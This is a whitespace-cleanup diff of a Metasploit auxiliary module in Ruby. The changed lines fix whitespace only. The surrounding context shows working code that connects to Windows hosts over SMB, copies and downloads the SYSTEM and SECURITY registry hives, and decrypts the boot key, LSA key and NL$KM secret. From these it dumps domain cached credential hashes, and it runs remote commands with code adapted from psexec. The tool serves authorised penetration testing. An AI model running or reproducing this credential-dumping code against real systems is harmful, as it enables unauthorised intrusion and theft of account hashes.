@@ -34,7 +34,7 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					'Royce Davis <rdavis[at]accuvant.com>',
 					'Twitter: <[at]R3dy__>',
-					
+
 				],
 			'References'  => [
 				['URL', 'http://www.pentestgeek.com'],
@@ -51,7 +51,7 @@ class Metasploit3 < Msf::Auxiliary
 		], self.class)
 
 		deregister_options('RHOST')
-		datastore['LOGDIR'] += "#{Time.new.strftime("%Y-%m-%d-%H%M%S")}"	
+		datastore['LOGDIR'] += "#{Time.new.strftime("%Y-%m-%d-%H%M%S")}"
 
 	end
 
@@ -81,13 +81,13 @@ class Metasploit3 < Msf::Auxiliary
 			"Primary Group",
 			"Additional Groups"
 		])
-		
+
 		secpath = "#{Rex::Text.rand_text_alpha(20)}"
 		syspath = "#{Rex::Text.rand_text_alpha(20)}"
 		hives = [secpath, syspath]
 		smbshare = datastore['SMBSHARE']
 		logdir = datastore['LOGDIR']
-		
+
 		#Try and Connect to the target
 		begin
 			connect()
@@ -102,13 +102,13 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("#{ip} - #{autherror}")
 			return
 		end
-		
+
 		begin
 			simple.connect(smbshare)
 			save_reg_hives(smbshare, ip, secpath, syspath)
 			print_status("#{ip} - Downloading SYSTEM and SECURITY hive files.")
 			download_hives(smbshare, ip, syspath, secpath, logdir)
-			cleanup_after(smbshare, ip, secpath, syspath) 
+			cleanup_after(smbshare, ip, secpath, syspath)
 			sys, sec = open_hives(logdir, ip)
 			dump_cache_creds(sec, sys, ip, credentials)
 			simple.connect(smbshare)
@@ -150,13 +150,13 @@ class Metasploit3 < Msf::Auxiliary
 			newdir = "#{logdir}/#{ip}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{smbshare}")
-	
+
 			# Get contents of hive file
 			remotesec = simple.open("\\WINDOWS\\Temp\\#{secpath}", 'rob')
 			remotesys = simple.open("\\WINDOWS\\Temp\\#{syspath}", 'rob')
 			secdata = remotesec.read
 			sysdata = remotesys.read
-	
+
 			# Save it to local file system
 			localsec = File.open("#{logdir}/#{ip}/sec", "w+")
 			localsys = File.open("#{logdir}/#{ip}/sys", "w+")
@@ -175,8 +175,8 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
-	
-	
+
+
 	#-------------------------------------------------------------------------------------------------------
 	# This method should hopefully open up a hive file from yoru local system and allow interacting with it
 	#-------------------------------------------------------------------------------------------------------
@@ -186,9 +186,9 @@ class Metasploit3 < Msf::Auxiliary
 		sec = Rex::Registry::Hive.new("#{path}/#{ip}/sec")
 		return sys, sec
 	end
-	
-	
-	
+
+
+
 	#-------------------------------------------------------------------------------------------------------------
 	# This method runs the cleanup commands that delete the SYSTEM and SECURITY hive copies from the WINDOWS\Temp
 	# directory on the target host
@@ -207,9 +207,9 @@ class Metasploit3 < Msf::Auxiliary
 			return cleanerror
 		end
 	end
-	
-	
-	
+
+
+
 	#-------------------------------------------------------
 	# Extracts the Domain Cached hashes from the hive files
 	#-------------------------------------------------------
@@ -259,19 +259,19 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 	end
-	
-	
+
+
 	#-----------------------------------------------------------------
 	# Extract the NLKM value from the SECURITY hive using the Lsa key
 	#-----------------------------------------------------------------
 	def get_nlkm(sec, lsa_key)
-		nlkm = sec.relative_query('\Policy\Secrets\NL$KM\CurrVal').value_list.values[0].value.data 
+		nlkm = sec.relative_query('\Policy\Secrets\NL$KM\CurrVal').value_list.values[0].value.data
 		decrypted = decrypt_secret( nlkm[0xC..-1], lsa_key )
-		return decrypted	
+		return decrypted
 	end
-	
-	
-	
+
+
+
 	#------------------------
 	# Decrypt a single hash
 	#------------------------
@@ -281,13 +281,13 @@ class Metasploit3 < Msf::Auxiliary
 		rc4.key = rc4key
 		dec  = rc4.update(edata)
 		dec << rc4.final
-		
+
 		return dec
 	end
-	
-	
-	
-	#----------------------------------------------------	
+
+
+
+	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
 	#----------------------------------------------------
 	def parse_decrypted_cache(dec_data, s, credentials)
@@ -409,9 +409,9 @@ class Metasploit3 < Msf::Auxiliary
 		return "#{username.downcase}:#{hash.unpack("H*")[0]}:#{dnsDomainName.downcase}:#{logonDomainName.downcase}\n"
 	end
 
-	
-	
-	#----------------------------------------------------	
+
+
+	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
 	#----------------------------------------------------
 	def parse_cache_entry(cache_data)
@@ -476,13 +476,13 @@ class Metasploit3 < Msf::Auxiliary
 
 		s.ch = cache_data[64,16]
 		s.enc_data = cache_data[96..-1]
-		
+
 		return s
 	end
-	
-	
-	
-	#----------------------------------------------------	
+
+
+
+	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
 	#----------------------------------------------------
 	def convert_des_56_to_64(kstr)
@@ -524,9 +524,9 @@ class Metasploit3 < Msf::Auxiliary
 		return key.pack("C*")
 	end
 
-	
-	
-	#----------------------------------------------------	
+
+
+	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
 	#----------------------------------------------------
 	def decrypt_secret(secret, key)
@@ -553,10 +553,10 @@ class Metasploit3 < Msf::Auxiliary
 		dec_data_len = decrypted_data[0].ord
 		return decrypted_data[8..8+dec_data_len]
 	end
-	
-	
-	
-	#----------------------------------------------------	
+
+
+
+	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
 	#----------------------------------------------------
 	def decrypt_lsa(pol, encryptedkey)
@@ -580,7 +580,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#----------------------------------------------------	
+	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
 	#----------------------------------------------------
 	def get_lsa_key(sec, bootkey)
@@ -588,12 +588,12 @@ class Metasploit3 < Msf::Auxiliary
 			enc_reg_key = sec.relative_query('\Policy\PolSecretEncryptionKey')
 			obf_lsa_key = enc_reg_key.value_list.values[0].value.data
 			@vista = 0
-		rescue 
+		rescue
 			enc_reg_key = sec.relative_query('\Policy\PolEKList')
-			obf_lsa_key = enc_reg_key.value_list.values[0].value.data 
+			obf_lsa_key = enc_reg_key.value_list.values[0].value.data
 			@vista = 1
 		end
-		
+
 		if ( @vista == 1 )
 			lsa_key = decrypt_lsa(obf_lsa_key, bootkey)
 			lsa_key = lsa_key[68,32]
@@ -612,12 +612,12 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		return lsa_key
 	end
-	
-	
 
-	#----------------------------------------------------	
+
+
+	#----------------------------------------------------
 	# Code sampled from post/windows/gather/cachedump.rb
-	#----------------------------------------------------	
+	#----------------------------------------------------
 	def get_boot_key(hive, ip)
 		begin
 			vprint_status("Getting boot key")
@@ -643,10 +643,10 @@ class Metasploit3 < Msf::Auxiliary
 
 				bootkey << [tmp].pack("H*")
 			end
-	
+
 			keybytes = bootkey.unpack("C*")
-				
-				
+
+
 			p = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
 			scrambled = ""
 			p.each do |i|
@@ -658,9 +658,9 @@ class Metasploit3 < Msf::Auxiliary
 			return boot_key_error
 		end
 	end
-	
-	
-	
+
+
+
 	#------------------------------------------------------------------------------------------------------------------------
 	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
@@ -781,7 +781,7 @@ class Metasploit3 < Msf::Auxiliary
 		rescue ::Exception => e
 			print_error("Error: #{e}")
 		end
-			
+
 		begin
 			#print_status("Deleting \\#{filename}...")
 			select(nil, nil, nil, 1.0)
